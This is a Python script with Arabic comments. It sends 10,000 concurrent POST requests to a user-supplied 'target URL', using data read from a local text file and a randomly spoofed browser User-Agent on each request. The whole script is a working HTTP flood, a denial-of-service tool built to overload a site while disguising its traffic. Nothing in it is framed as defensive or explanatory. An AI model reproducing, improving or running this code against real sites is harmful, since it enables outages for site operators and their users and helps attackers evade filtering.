import aiohttp
import asyncio
import os
import random
import time

async def send_request(session, url, data):
    try:
        async with session.post(url, data=data, headers={'User-Agent': generate_user_agent()}) as response:
            print("Request sent:", response.status)
            await asyncio.sleep(0.1)  # توزيع الطلبات بين الاستجابات
    except Exception as e:
        print("Error:", e)

def generate_user_agent():
    # قائمة من التوزيعات الشائعة لأنظمة التشغيل والمتصفحات
    operating_systems = ['Windows NT 10.0', 'X11; Linux x86_64']
    browsers = ['Chrome', 'Firefox', 'Safari']
    # اختيار توزيع عشوائي
    operating_system = random.choice(operating_systems)
    browser = random.choice(browsers)
    # توليد رأس الطلب
    user_agent = f'Mozilla/5.0 ({operating_system}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/91.0.4472.124 Safari/537.36'
    return user_agent

async def main():
    target_url = input("Enter the target URL: ")

    data_file_path = find_data_file()

    if data_file_path:
        print(f"Data file found: {data_file_path}")
        with open(data_file_path, "r") as file:
            data = file.read()

        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(10000):  # تعدد الطلبات
                task = send_request(session, target_url, data.encode())
                tasks.append(task)
            await asyncio.gather(*tasks)
    else:
        print("No data file found!")

def find_data_file():
    for file in os.listdir():
        if file.endswith(".txt"):
            return file
    return None

asyncio.run(main())
